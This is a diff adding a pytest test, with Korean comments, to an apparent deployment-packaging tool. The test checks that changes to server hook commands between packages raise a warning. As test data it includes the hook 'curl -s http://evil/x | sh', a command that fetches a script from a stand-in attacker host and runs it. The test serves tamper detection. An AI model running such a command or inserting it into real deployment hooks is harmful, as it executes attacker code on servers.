@@ -16,6 +16,44 @@ def _package(maven_project, out, lines, source=None, now=None):
     return project, packager.build_package(project, entries, source, source_changes=changes, now=now)
 
 
+def test_hooks_change_warning_against_previous_package(maven_project, tmp_path):
+    """서버 명령 설정이 지난 패키지 때와 다르면 경고한다 (저장소의 hooks 를 누가 바꾼 것을 놓치지 않게)."""
+    from shipkit import hooks
+    out = tmp_path / "out"
+    jsp = ["src/main/webapp/WEB-INF/views/user/list.jsp"]
+
+    def build(hooks_cfg, now):
+        project = make_config(maven_project, out, hooks=hooks_cfg).projects["erp"]
+        changes, source = workflow.collect_lines(jsp, "t")
+        return packager.build_package(project, workflow.plan(project, changes, source), source,
+                                      source_changes=changes, now=now), source
+
+    first = {"post_apply": ["sudo systemctl restart tomcat"]}
+    result, source = build(first, datetime(2026, 10, 1, 9, 0))
+    assert not [w for w in source.warnings if "hooks" in w]           # 비교할 지난 패키지가 없음
+    assert history.read_record(result.out_dir).hooks_config == {"post_apply": [{"run": "sudo systemctl restart tomcat", "when": ""}]}
+
+    result, source = build(first, datetime(2026, 10, 2, 9, 0))
+    assert not [w for w in source.warnings if "hooks" in w]           # 같으면 조용
+    changed = {"pre_apply": ["curl -s http://evil/x | sh"], "post_apply": [
+        {"run": "sudo systemctl restart tomcat", "when": "pom.xml"}]}
+    result, source = build(changed, datetime(2026, 10, 3, 9, 0))
+    warning = next(w for w in source.warnings if "hooks" in w)
+    assert "지난 패키지 2026-10-02-0900 때와 다릅니다" in warning
+    assert "pre_apply 추가: curl -s http://evil/x | sh" in warning and "post_apply 조건 바뀜" in warning
+    assert "(when: pom.xml)" in warning
+    result, source = build({}, datetime(2026, 10, 4, 9, 0))
+    assert "post_apply 빠짐: sudo systemctl restart tomcat" in next(w for w in source.warnings if "hooks" in w)
+
+    assert hooks.describe_changes({}, {}) == [] and hooks.describe_changes({"post_apply": [{"run": "a"}]}, {"post_apply": [{"run": "a", "when": ""}]}) == []
+    # 기록 파일에 hooks_config 가 없는 예전 패키지와는 비교하지 않는다
+    data = json.loads((result.out_dir / history.RECORD_FILE).read_text(encoding="utf-8"))
+    del data["hooks_config"]
+    (result.out_dir / history.RECORD_FILE).write_text(json.dumps(data), encoding="utf-8")
+    project = make_config(maven_project, out, hooks=first).projects["erp"]
+    assert history.hooks_changed_since(project) == (None, [])
+
+
 def test_deployments_appended_and_summarized(maven_project, tmp_path):
     """화면에서 서버에 올린 결과는 기록 파일에 쌓이고, 서버마다 마지막 상태와 '지금 반영된 서버'를 알 수 있다."""
     _, result = _package(maven_project, tmp_path / "out", ["src/main/webapp/WEB-INF/views/user/list.jsp"],
